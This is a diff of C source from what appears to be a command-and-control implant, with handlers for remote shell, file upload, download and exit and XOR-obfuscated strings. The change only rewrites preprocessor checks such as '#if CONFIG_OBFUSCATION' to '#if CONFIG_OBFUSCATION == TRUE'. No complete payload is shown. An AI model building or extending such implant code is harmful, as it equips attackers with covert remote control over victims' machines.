@@ -34,7 +34,7 @@ VOID CommandDispatcher() {
 
 
 //--------------------------------
-#if CONFIG_OBFUSCATION
+#if CONFIG_OBFUSCATION == TRUE
             unsigned char s_xk[] = S_XK;
             unsigned char s_string[] = S_INSTANCE_NOT_CONNECTED;
             // _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
@@ -74,7 +74,7 @@ VOID CommandDispatcher() {
                     if ( ! FoundCommand ) {
 
 //--------------------------------
-#if CONFIG_OBFUSCATION
+#if CONFIG_OBFUSCATION == TRUE
                         unsigned char s_xk[] = S_XK;
                         unsigned char s_string[] = S_COMMAND_NOT_FOUND;
                         // _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
@@ -87,7 +87,7 @@ VOID CommandDispatcher() {
                 } else {
 
 //--------------------------------
-#if CONFIG_OBFUSCATION
+#if CONFIG_OBFUSCATION == TRUE
                     unsigned char s_xk[] = S_XK;
                     unsigned char s_string[] = S_IS_COMMAND_NO_JOB;
                     // _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
@@ -107,7 +107,7 @@ VOID CommandDispatcher() {
         } else {
 
 //--------------------------------
-#if CONFIG_OBFUSCATION
+#if CONFIG_OBFUSCATION == TRUE
             unsigned char s_xk[] = S_XK;
             unsigned char s_string[] = S_TRANSPORT_FAILED;
             // _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
@@ -132,7 +132,7 @@ VOID CommandShell( PPARSER Parser ){
     void *p_ntdll = get_ntdll_32();
 #endif //CONFIG_ARCH
 //--------------------------------
-#if CONFIG_OBFUSCATION
+#if CONFIG_OBFUSCATION == TRUE
     unsigned char s_xk[] = S_XK;
     unsigned char s_string[] = S_COMMAND_SHELL;
     // _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
@@ -140,7 +140,7 @@ VOID CommandShell( PPARSER Parser ){
     // _tprintf("Command::Shell\n");
 #endif
 //---------------------------------
-#if CONFIG_NATIVE
+#if CONFIG_NATIVE == TRUE
 
     DWORD   Length           = 0;
     PCHAR   Command          = NULL;
@@ -327,7 +327,7 @@ VOID CommandUpload( PPARSER Parser ) {
 #endif //CONFIG_ARCH
 
 
-#if CONFIG_NATIVE
+#if CONFIG_NATIVE == TRUE
     unsigned char s_xk[] = S_XK;
     // unsigned char s_string[] = S_COMMAND_UPLOAD;
     // _tprintf("%s\n", xor_dec((char *) s_string, sizeof(s_string), (char *) s_xk, sizeof(s_xk)));
@@ -442,7 +442,7 @@ VOID CommandDownload( PPARSER Parser ) {
 #endif //CONFIG_ARCH
 
 //--------------------------------
-#if CONFIG_NATIVE
+#if CONFIG_NATIVE == TRUE
     unsigned char s_xk[] = S_XK;
     unsigned char s_string[] = S_COMMAND_DOWNLOAD;
     // _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
@@ -575,7 +575,7 @@ VOID CommandDownload( PPARSER Parser ) {
 VOID CommandExit( PPARSER Parser ) {
 
 //--------------------------------
-#if CONFIG_OBFUSCATION
+#if CONFIG_OBFUSCATION == TRUE
     unsigned char s_xk[] = S_XK;
     unsigned char s_string[] = S_COMMAND_EXIT;
     // _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
